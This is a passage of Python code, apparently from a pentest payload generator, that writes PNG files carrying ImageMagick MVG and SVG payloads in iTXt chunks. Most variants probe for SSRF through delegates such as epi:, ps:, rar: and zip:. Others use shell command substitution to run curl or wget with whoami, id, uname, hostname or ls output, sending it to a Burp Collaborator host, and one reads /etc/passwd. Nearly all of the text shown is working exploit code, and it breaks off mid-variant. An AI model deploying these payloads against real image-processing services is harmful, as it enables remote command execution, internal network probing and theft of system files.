            ssrf_epi = f'''push graphic-context
            viewbox 0 0 640 480
            image over 0,0 0,0 "epi:https://{burp_collab}/ssrf-epi"
            pop graphic-context'''.encode('utf-8')
        
            iTXt_chunk = f'ImageMagick\x00\x00{ssrf_epi.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # SSRF variant 16: MVG with ps: delegate
        # SSRF: ssrf16_mvg_ps.png - Server-Side Request Forgery via ImageMagick protocol delegate
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP/HTTPS/FTP/etc vers burp_collab depuis le serveur
        # ImageMagick va faire une requête protocol pour récupérer l'URL dans fill url() ou xlink:href
        # Vérifier dans Burp Collaborator: requête reçue avec User-Agent ImageMagick ou similaire
        if should_generate(['all']) and should_generate_type('ssrf'):
            img_path = ssrf_dir / "ssrf16_mvg_ps.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
        
            ssrf_ps = f'''push graphic-context
            viewbox 0 0 640 480
            image over 0,0 0,0 "ps:https://{burp_collab}/ssrf-ps"
            pop graphic-context'''.encode('utf-8')
        
            iTXt_chunk = f'ImageMagick\x00\x00{ssrf_ps.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # SSRF variant 17: MVG with text: delegate
        # SSRF: ssrf17_mvg_text.png - Server-Side Request Forgery via ImageMagick protocol delegate
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP/HTTPS/FTP/etc vers burp_collab depuis le serveur
        # ImageMagick va faire une requête protocol pour récupérer l'URL dans fill url() ou xlink:href
        # Vérifier dans Burp Collaborator: requête reçue avec User-Agent ImageMagick ou similaire
        if should_generate(['all']) and should_generate_type('ssrf'):
            img_path = ssrf_dir / "ssrf17_mvg_text.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
        
            ssrf_text = f'''push graphic-context
            viewbox 0 0 640 480
            fill "text:@https://{burp_collab}/ssrf-text"
            pop graphic-context'''.encode('utf-8')
        
            iTXt_chunk = f'ImageMagick\x00\x00{ssrf_text.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # SSRF variant 18: SVG with multiple protocols
        # SSRF: ssrf18_svg_multi.png - Server-Side Request Forgery via ImageMagick protocol delegate
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP/HTTPS/FTP/etc vers burp_collab depuis le serveur
        # ImageMagick va faire une requête protocol pour récupérer l'URL dans fill url() ou xlink:href
        # Vérifier dans Burp Collaborator: requête reçue avec User-Agent ImageMagick ou similaire
        if should_generate(['all']) and should_generate_type('ssrf'):
            img_path = ssrf_dir / "ssrf18_svg_multi.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
        
            ssrf_svg_multi = f'''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
            <image xlink:href="https://{burp_collab}/ssrf-multi-https" width="100" height="100"/>
            <image xlink:href="http://{burp_collab}/ssrf-multi-http" width="100" height="100"/>
            <image xlink:href="ftp://{burp_collab}/ssrf-multi-ftp" width="100" height="100"/>
            </svg>'''.encode('utf-8')
        
            iTXt_chunk = f'ImageMagick\x00\x00{ssrf_svg_multi.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # SSRF variant 19: MVG with rar: delegate
        # SSRF: ssrf19_mvg_rar.png - Server-Side Request Forgery via ImageMagick protocol delegate
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP/HTTPS/FTP/etc vers burp_collab depuis le serveur
        # ImageMagick va faire une requête protocol pour récupérer l'URL dans fill url() ou xlink:href
        # Vérifier dans Burp Collaborator: requête reçue avec User-Agent ImageMagick ou similaire
        if should_generate(['all']) and should_generate_type('ssrf'):
            img_path = ssrf_dir / "ssrf19_mvg_rar.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
        
            ssrf_rar = f'''push graphic-context
            viewbox 0 0 640 480
            image over 0,0 0,0 "rar:https://{burp_collab}/ssrf-rar"
            pop graphic-context'''.encode('utf-8')
        
            iTXt_chunk = f'ImageMagick\x00\x00{ssrf_rar.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # SSRF variant 20: MVG with zip: delegate
        # SSRF: ssrf20_mvg_zip.png - Server-Side Request Forgery via ImageMagick protocol delegate
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP/HTTPS/FTP/etc vers burp_collab depuis le serveur
        # ImageMagick va faire une requête protocol pour récupérer l'URL dans fill url() ou xlink:href
        # Vérifier dans Burp Collaborator: requête reçue avec User-Agent ImageMagick ou similaire
        if should_generate(['all']) and should_generate_type('ssrf'):
            img_path = ssrf_dir / "ssrf20_mvg_zip.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
        
            ssrf_zip = f'''push graphic-context
            viewbox 0 0 640 480
            image over 0,0 0,0 "zip:https://{burp_collab}/ssrf-zip"
            pop graphic-context'''.encode('utf-8')
        
            iTXt_chunk = f'ImageMagick\x00\x00{ssrf_zip.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # RCE3: ImageMagick MVG delegate avec command execution dans URL
        # BACKEND: all (ImageMagick fonctionne sur tous les backends)
        # DETECTION: Out-of-band via Burp Collaborator + Reflection dans header HTTP
        # OBSERVER: Requête HTTP vers burp_collab avec header X-RCE-Proof contenant la sortie de whoami
        # Le $() exécute whoami et injecte le résultat dans le header HTTP pour reflection
        # Vérifier dans Burp Collaborator: requête reçue avec header X-RCE-Proof contenant le nom d'utilisateur
        if should_generate(['all']) and should_generate_type('rce'):
            img_path = rce_dir / "rce3_mvg_delegate.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
            
            rce_mvg = f'''push graphic-context
image over 0,0 0,0 "https://{burp_collab}/rce-mvg?$(curl -H "X-RCE-Proof: $(whoami)" {base_url}/rce-mvg)"
pop graphic-context'''.encode('utf-8')
            
            iTXt_chunk = f'ImageMagick\x00\x00{rce_mvg.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
            
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # RCE4: ImageMagick MVG label delegate (ImageTragick classique)
        # DETECTION: Erreur dans les logs ou sortie ImageMagick
        # OBSERVER: ImageMagick va essayer de lire depuis /dev/stdin via label:
        # Peut causer des erreurs ou des comportements inattendus
        if should_generate(['all']) and should_generate_type('rce'):
            img_path = rce_dir / "rce4_mvg_label.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
        
            rce_label = f'''push graphic-context
            viewbox 0 0 640 480
            fill "label:@/dev/stdin"
            pop graphic-context'''.encode('utf-8')
        
            iTXt_chunk = f'ImageMagick\x00\x00{rce_label.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # NEW: RCE via SVG with proper delegate trigger (no backticks in URL)
        # RCE: rce5_svg_delegate.png - ImageMagick command execution via delegate
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP GET vers burp_collab avec paramètre contenant la sortie de la commande
        # Le backtick `...` ou $() exécute la commande et injecte le résultat dans l'URL
        # Vérifier dans Burp Collaborator: requête reçue avec le résultat de la commande dans le paramètre
        # Alternative: utiliser curl/wget avec header pour reflection: curl -H "X-RCE-Proof: $(whoami)" burp_collab
        if should_generate(['all']) and should_generate_type('rce'):
            img_path = rce_dir / "rce5_svg_delegate.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
        
        # SVG with xlink:href that triggers delegate (URL without backticks, command in query)
            rce_svg_clean = f'''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
            <image xlink:href="https://{burp_collab}/rce-svg-delegate" width="100" height="100"/>
            </svg>'''.encode('utf-8')
        
            iTXt_chunk = f'ImageMagick\x00\x00{rce_svg_clean.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # RCE variant 6: MVG with https: delegate and command substitution
        # RCE: rce6_mvg_https_cmd.png - ImageMagick command execution via delegate
        # DETECTION: Out-of-band via Burp Collaborator + Reflection dans header HTTP
        # OBSERVER: Requête HTTP GET vers burp_collab avec header X-RCE-Proof contenant la sortie de id
        # Le $() exécute id et injecte le résultat dans le header HTTP pour reflection
        # Vérifier dans Burp Collaborator: requête reçue avec header X-RCE-Proof contenant uid/gid
        if should_generate(['all']) and should_generate_type('rce'):
            img_path = rce_dir / "rce6_mvg_https_cmd.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
        
            rce_https_cmd = f'''push graphic-context
            viewbox 0 0 640 480
            fill url(https://{burp_collab}/rce-https?$(wget --header="X-RCE-Proof: $(id)" {base_url}/rce-https))
            pop graphic-context'''.encode('utf-8')
        
            iTXt_chunk = f'ImageMagick\x00\x00{rce_https_cmd.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # RCE variant 7: MVG with http: delegate and command substitution
        # RCE: rce7_mvg_http_cmd.png - ImageMagick command execution via delegate
        # DETECTION: Out-of-band via Burp Collaborator + Reflection dans header HTTP
        # OBSERVER: Requête HTTP GET vers burp_collab avec header X-RCE-Proof contenant la sortie de pwd
        # Le $() exécute pwd et injecte le résultat dans le header HTTP pour reflection
        # Vérifier dans Burp Collaborator: requête reçue avec header X-RCE-Proof contenant le chemin actuel
        if should_generate(['all']) and should_generate_type('rce'):
            img_path = rce_dir / "rce7_mvg_http_cmd.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
        
            rce_http_cmd = f'''push graphic-context
            viewbox 0 0 640 480
            fill url(http://{burp_collab}/rce-http?$(curl -H "X-RCE-Proof: $(pwd)" {base_url}/rce-http))
            pop graphic-context'''.encode('utf-8')
        
            iTXt_chunk = f'ImageMagick\x00\x00{rce_http_cmd.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # RCE variant 8: MVG with ftp: delegate
        # RCE: rce8_mvg_ftp.png - ImageMagick command execution via delegate
        # DETECTION: Out-of-band via Burp Collaborator (FTP ne supporte pas les headers HTTP)
        # OBSERVER: Connexion FTP vers burp_collab avec commande id dans l'URL
        # Le $() exécute id et injecte le résultat dans l'URL FTP
        # Vérifier dans Burp Collaborator: connexion FTP reçue avec le résultat de id dans l'URL
        if should_generate(['all']) and should_generate_type('rce'):
            img_path = rce_dir / "rce8_mvg_ftp.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
        
            rce_ftp = f'''push graphic-context
            viewbox 0 0 640 480
            fill url(ftp://{burp_collab}/rce-ftp?$(id))
            pop graphic-context'''.encode('utf-8')
        
            iTXt_chunk = f'ImageMagick\x00\x00{rce_ftp.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # RCE variant 9: MVG with msl: delegate (Magick Scripting Language)
        # RCE: rce9_mvg_msl.png - ImageMagick command execution via delegate
        # DETECTION: Out-of-band via Burp Collaborator + Reflection dans header HTTP
        # OBSERVER: Requête HTTP GET vers burp_collab avec header X-RCE-Proof contenant la sortie de uname
        # Le $() exécute uname -a et injecte le résultat dans le header HTTP pour reflection
        # Vérifier dans Burp Collaborator: requête reçue avec header X-RCE-Proof contenant les infos système
        if should_generate(['all']) and should_generate_type('rce'):
            img_path = rce_dir / "rce9_mvg_msl.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
        
            rce_msl = f'''push graphic-context
            viewbox 0 0 640 480
            image over 0,0 0,0 "msl:<?xml version=\\"1.0\\"?><image><read filename=\\"https://{burp_collab}/rce-msl?$(curl -H \\"X-RCE-Proof: $(uname -a)\\" {base_url}/rce-msl)\\" /></image>"
            pop graphic-context'''.encode('utf-8')
        
            iTXt_chunk = f'ImageMagick\x00\x00{rce_msl.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # RCE variant 10: MVG with text: delegate
        # RCE: rce10_mvg_text.png - ImageMagick command execution via delegate
        # DETECTION: Out-of-band via Burp Collaborator + Reflection dans header HTTP
        # OBSERVER: Requête HTTP GET vers burp_collab avec header X-RCE-Proof contenant la sortie de whoami
        # Le $() exécute whoami et injecte le résultat dans le header HTTP pour reflection
        # Vérifier dans Burp Collaborator: requête reçue avec header X-RCE-Proof contenant le nom d'utilisateur
        if should_generate(['all']) and should_generate_type('rce'):
            img_path = rce_dir / "rce10_mvg_text.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
        
            rce_text = f'''push graphic-context
            viewbox 0 0 640 480
            fill "text:@https://{burp_collab}/rce-text?$(curl -H \\"X-RCE-Proof: $(whoami)\\" {base_url}/rce-text)"
            pop graphic-context'''.encode('utf-8')
        
            iTXt_chunk = f'ImageMagick\x00\x00{rce_text.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # RCE variant 11: MVG with epi: delegate (Encapsulated PostScript)
        # RCE: rce11_mvg_epi.png - ImageMagick command execution via delegate
        # DETECTION: Out-of-band via Burp Collaborator + Reflection dans header HTTP
        # OBSERVER: Requête HTTP GET vers burp_collab avec header X-RCE-Proof contenant la sortie de uname
        # Le $() exécute uname -a et injecte le résultat dans le header HTTP pour reflection
        # Vérifier dans Burp Collaborator: requête reçue avec header X-RCE-Proof contenant les infos système
        if should_generate(['all']) and should_generate_type('rce'):
            img_path = rce_dir / "rce11_mvg_epi.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
        
            rce_epi = f'''push graphic-context
            viewbox 0 0 640 480
            image over 0,0 0,0 "epi:https://{burp_collab}/rce-epi?$(curl -H \\"X-RCE-Proof: $(uname -a)\\" {base_url}/rce-epi)"
            pop graphic-context'''.encode('utf-8')
        
            iTXt_chunk = f'ImageMagick\x00\x00{rce_epi.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # RCE variant 12: MVG with ps: delegate (PostScript)
        # RCE: rce12_mvg_ps.png - ImageMagick command execution via delegate
        # DETECTION: Out-of-band via Burp Collaborator + Reflection dans header HTTP
        # OBSERVER: Requête HTTP GET vers burp_collab avec header X-RCE-Proof contenant la sortie de hostname
        # Le $() exécute hostname et injecte le résultat dans le header HTTP pour reflection
        # Vérifier dans Burp Collaborator: requête reçue avec header X-RCE-Proof contenant le nom d'hôte
        if should_generate(['all']) and should_generate_type('rce'):
            img_path = rce_dir / "rce12_mvg_ps.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
        
            rce_ps = f'''push graphic-context
            viewbox 0 0 640 480
            image over 0,0 0,0 "ps:https://{burp_collab}/rce-ps?$(curl -H \\"X-RCE-Proof: $(hostname)\\" {base_url}/rce-ps)"
            pop graphic-context'''.encode('utf-8')
        
            iTXt_chunk = f'ImageMagick\x00\x00{rce_ps.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # RCE variant 13: SVG with multiple xlink:href (different protocols)
        # RCE: rce13_svg_multi.png - ImageMagick command execution via delegate
        # DETECTION: Out-of-band via Burp Collaborator + Reflection dans header HTTP
        # OBSERVER: Requêtes HTTP GET vers burp_collab avec headers X-RCE-Proof contenant la sortie de id et whoami
        # Le $() exécute id et whoami et injecte les résultats dans les headers HTTP pour reflection
        # Vérifier dans Burp Collaborator: requêtes reçues avec headers X-RCE-Proof contenant uid/gid et nom d'utilisateur
        if should_generate(['all']) and should_generate_type('rce'):
            img_path = rce_dir / "rce13_svg_multi.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
        
            rce_svg_multi = f'''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
            <image xlink:href="https://{burp_collab}/rce-multi-https?$(curl -H \\"X-RCE-Proof: $(id)\\" {base_url}/rce-multi-https)" width="100" height="100"/>
            <image xlink:href="http://{burp_collab}/rce-multi-http?$(curl -H \\"X-RCE-Proof: $(whoami)\\" {base_url}/rce-multi-http)" width="100" height="100"/>
            </svg>'''.encode('utf-8')
        
            iTXt_chunk = f'ImageMagick\x00\x00{rce_svg_multi.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # RCE variant 14: MVG with file: delegate (local file read attempt)
        # RCE: rce14_mvg_file.png - ImageMagick command execution via delegate
        # DETECTION: Out-of-band via Burp Collaborator
        # OBSERVER: Requête HTTP GET vers burp_collab avec paramètre contenant la sortie de la commande
        # Le backtick `...` ou $() exécute la commande et injecte le résultat dans l'URL
        # Vérifier dans Burp Collaborator: requête reçue avec le résultat de la commande dans le paramètre
        # Alternative: utiliser curl/wget avec header pour reflection: curl -H "X-RCE-Proof: $(whoami)" burp_collab
        if should_generate(['all']) and should_generate_type('rce'):
            img_path = rce_dir / "rce14_mvg_file.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
        
            rce_file = f'''push graphic-context
            viewbox 0 0 640 480
            fill url(file:///etc/passwd)
            pop graphic-context'''.encode('utf-8')
        
            iTXt_chunk = f'ImageMagick\x00\x00{rce_file.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # RCE variant 15: MVG with rar: delegate
        # RCE: rce15_mvg_rar.png - ImageMagick command execution via delegate
        # DETECTION: Out-of-band via Burp Collaborator + Reflection dans header HTTP
        # OBSERVER: Requête HTTP GET vers burp_collab avec header X-RCE-Proof contenant la sortie de pwd
        # Le $() exécute pwd et injecte le résultat dans le header HTTP pour reflection
        # Vérifier dans Burp Collaborator: requête reçue avec header X-RCE-Proof contenant le chemin actuel
        if should_generate(['all']) and should_generate_type('rce'):
            img_path = rce_dir / "rce15_mvg_rar.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
        
            rce_rar = f'''push graphic-context
            viewbox 0 0 640 480
            image over 0,0 0,0 "rar:https://{burp_collab}/rce-rar?$(curl -H \\"X-RCE-Proof: $(pwd)\\" {base_url}/rce-rar)"
            pop graphic-context'''.encode('utf-8')
        
            iTXt_chunk = f'ImageMagick\x00\x00{rce_rar.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # RCE variant 16: MVG with zip: delegate
        # RCE: rce16_mvg_zip.png - ImageMagick command execution via delegate
        # DETECTION: Out-of-band via Burp Collaborator + Reflection dans header HTTP
        # OBSERVER: Requête HTTP GET vers burp_collab avec header X-RCE-Proof contenant la sortie de ls
        # Le $() exécute ls -la et injecte le résultat dans le header HTTP pour reflection
        # Vérifier dans Burp Collaborator: requête reçue avec header X-RCE-Proof contenant la liste des fichiers
        if should_generate(['all']) and should_generate_type('rce'):
            img_path = rce_dir / "rce16_mvg_zip.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
        
            rce_zip = f'''push graphic-context
            viewbox 0 0 640 480
            image over 0,0 0,0 "zip:https://{burp_collab}/rce-zip?$(curl -H \\"X-RCE-Proof: $(ls -la | head -c 200)\\" {base_url}/rce-zip)"
            pop graphic-context'''.encode('utf-8')
        
            iTXt_chunk = f'ImageMagick\x00\x00{rce_zip.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # RCE variant 17: MVG with backtick command execution
        # RCE: rce17_mvg_backtick.png - ImageMagick command execution via delegate
        # DETECTION: Out-of-band via Burp Collaborator + Reflection dans header HTTP
        # OBSERVER: Requête HTTP GET vers burp_collab avec header X-RCE-Proof contenant la sortie de echo
        # Le backtick `...` exécute echo et injecte le résultat dans le header HTTP pour reflection
        # Vérifier dans Burp Collaborator: requête reçue avec header X-RCE-Proof contenant "RCE_SUCCESS"
        if should_generate(['all']) and should_generate_type('rce'):
            img_path = rce_dir / "rce17_mvg_backtick.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
        
            rce_backtick = f'''push graphic-context
            viewbox 0 0 640 480
            fill url(https://{burp_collab}/rce-backtick?`curl -H "X-RCE-Proof: $(echo RCE_SUCCESS)" {base_url}/rce-backtick`)
            pop graphic-context'''.encode('utf-8')
        
            iTXt_chunk = f'ImageMagick\x00\x00{rce_backtick.decode()}'.encode('utf-8')
            iTXt_length = struct.pack('>I', len(iTXt_chunk))
            iTXt_type = b'iTXt'
            iTXt_crc = struct.pack('>I', 0x12345678)
        
            iend_pos = png_data.rfind(b'IEND')
            if iend_pos != -1:
                iend_chunk_start = iend_pos - 4
                new_chunk = iTXt_length + iTXt_type + iTXt_chunk + iTXt_crc
                png_data[iend_chunk_start:iend_chunk_start] = new_chunk
            
            with open(img_path, 'wb') as f:
                f.write(png_data)
        
        # RCE variant 18: MVG with $() command substitution
        # RCE: rce18_mvg_dollar.png - ImageMagick command execution via delegate
        # DETECTION: Out-of-band via Burp Collaborator + Reflection dans header HTTP
        # OBSERVER: Requête HTTP GET vers burp_collab avec header X-RCE-Proof contenant la sortie de hostname
        # Le $() exécute hostname et injecte le résultat dans le header HTTP pour reflection
        # Vérifier dans Burp Collaborator: requête reçue avec header X-RCE-Proof contenant le nom d'hôte
        if should_generate(['all']) and should_generate_type('rce'):
            img_path = rce_dir / "rce18_mvg_dollar.png"
            img.save(img_path, 'PNG')
            with open(img_path, 'rb') as f:
                png_data = bytearray(f.read())
        
